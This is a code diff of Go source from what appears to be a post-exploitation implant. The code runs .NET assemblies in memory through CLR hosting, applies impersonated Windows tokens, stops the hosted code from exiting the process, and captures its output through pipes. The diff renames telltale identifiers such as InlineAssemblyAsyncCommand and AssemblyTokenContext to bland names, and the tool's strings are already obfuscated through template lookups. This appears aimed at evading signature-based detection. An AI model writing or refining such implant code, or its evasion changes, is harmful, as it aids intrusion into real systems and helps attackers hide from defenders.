@@ -83,8 +83,8 @@ func iaaClrErrCode() string { return iaTpl(idxIAClrErrCode) }
 
 func iaaClrCorrupt() string { return iaTpl(idxIAClrCorrupt) }
 
-// AssemblyTokenContext stores token information for assembly execution
-type AssemblyTokenContext struct {
+// NativeCredCtx stores token information for assembly execution
+type NativeCredCtx struct {
 	IsImpersonating bool
 	ActiveToken     string
 	NetOnlyToken    string
@@ -92,7 +92,7 @@ type AssemblyTokenContext struct {
 }
 
 // captureCurrentAssemblyTokenContext captures the current token context for async execution
-func captureCurrentAssemblyTokenContext() *AssemblyTokenContext {
+func captureCurrentAssemblyTokenContext() *NativeCredCtx {
 	if globalTokenStore == nil {
 		return nil
 	}
@@ -100,7 +100,7 @@ func captureCurrentAssemblyTokenContext() *AssemblyTokenContext {
 	globalTokenStore.mu.RLock()
 	defer globalTokenStore.mu.RUnlock()
 
-	return &AssemblyTokenContext{
+	return &NativeCredCtx{
 		IsImpersonating: globalTokenStore.IsImpersonating,
 		ActiveToken:     globalTokenStore.ActiveToken,
 		NetOnlyToken:    globalTokenStore.NetOnlyToken,
@@ -109,7 +109,7 @@ func captureCurrentAssemblyTokenContext() *AssemblyTokenContext {
 }
 
 // applyAssemblyTokenContextWithDuplication applies the stored token context using token duplication
-func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext) (func(), syscall.Handle) {
+func applyAssemblyTokenContextWithDuplication(tokenContext *NativeCredCtx) (func(), syscall.Handle) {
 	if tokenContext == nil || globalTokenStore == nil {
 		return func() {}, 0
 	}
@@ -206,7 +206,7 @@ func applyAssemblyTokenContextWithDuplication(tokenContext *AssemblyTokenContext
 }
 
 // executeWindowsAssemblyAsync executes assembly asynchronously with protection against exit
-func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes []byte, config struct {
+func (c *NativeAsyncMsg) executeWindowsAssemblyAsync(assemblyBytes []byte, config struct {
 	AssemblyB64 string   `json:"ab"`
 	Arguments   []string `json:"ar"`
 	AppDomain   string   `json:"ad"`
@@ -216,7 +216,7 @@ func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes [
 	EntryPoint  string   `json:"ep"`
 	UsePipe     bool     `json:"up"`
 	PipeName    string   `json:"pm"`
-}, job *AssemblyJob, tokenContext *AssemblyTokenContext) (int, error) {
+}, job *NativeJob, tokenContext *NativeCredCtx) (int, error) {
 	job.Output.WriteString(iaaOutputStart())
 
 	// Ensure exit prevention is initialized
@@ -269,12 +269,12 @@ func (c *InlineAssemblyAsyncCommand) executeWindowsAssemblyAsync(assemblyBytes [
 	}
 	job.OutputMutex.Unlock()
 
-	// Execute with protection and appropriate timeout
+	// execute with protection and appropriate timeout
 	return c.executeWithAsyncPipeCapture(assemblyBytes, config.Arguments, job, executionNumber, hasRunfor, runforDuration, tokenContext)
 }
 
 // executeWithAsyncPipeCapture captures output with protection against exit and token context
-func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes []byte, arguments []string, job *AssemblyJob, executionNumber int, hasRunfor bool, runforDuration int, tokenContext *AssemblyTokenContext) (int, error) {
+func (c *NativeAsyncMsg) executeWithAsyncPipeCapture(assemblyBytes []byte, arguments []string, job *NativeJob, executionNumber int, hasRunfor bool, runforDuration int, tokenContext *NativeCredCtx) (int, error) {
 
 	type execResult struct {
 		code int
@@ -340,7 +340,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 
 		err := syscall.CreatePipe(&readPipe, &writePipe, &sa, 1024*1024) // 1MB buffer
 		if err != nil {
-			// Execute without capture but with protection
+			// execute without capture but with protection
 			retCode, err := c.executeProtectedDirect(assemblyBytes, arguments, hasRunfor, runforDuration, duplicatedTokenHandle)
 			resultChan <- execResult{retCode, err}
 			return
@@ -403,7 +403,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 			}
 		}()
 
-		// Execute the assembly with protection
+		// execute the assembly with protection
 
 		// Detect runtime version
 		targetRuntime := iaClrV4()
@@ -411,7 +411,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 			targetRuntime = iaClrV2()
 		}
 
-		// Execute with panic protection
+		// execute with panic protection
 		var retCode int32
 		var execErr error
 
@@ -527,7 +527,7 @@ func (c *InlineAssemblyAsyncCommand) executeWithAsyncPipeCapture(assemblyBytes [
 }
 
 // executeProtectedDirect executes without pipe capture but with exit protection and token
-func (c *InlineAssemblyAsyncCommand) executeProtectedDirect(assemblyBytes []byte, arguments []string, hasRunfor bool, runforDuration int, tokenHandle syscall.Handle) (int, error) {
+func (c *NativeAsyncMsg) executeProtectedDirect(assemblyBytes []byte, arguments []string, hasRunfor bool, runforDuration int, tokenHandle syscall.Handle) (int, error) {
 	targetRuntime := iaClrV4()
 	if bytes.Contains(assemblyBytes, []byte(iaClrV2Full())) {
 		targetRuntime = iaClrV2()
@@ -579,7 +579,7 @@ func (c *InlineAssemblyAsyncCommand) executeProtectedDirect(assemblyBytes []byte
 }
 
 // isDLLAssembly checks if the assembly is a DLL
-func (c *InlineAssemblyAsyncCommand) isDLLAssembly(assemblyBytes []byte) bool {
+func (c *NativeAsyncMsg) isDLLAssembly(assemblyBytes []byte) bool {
 	// Check PE headers to determine if it's a DLL
 	if len(assemblyBytes) < 0x3C+4 {
 		return false
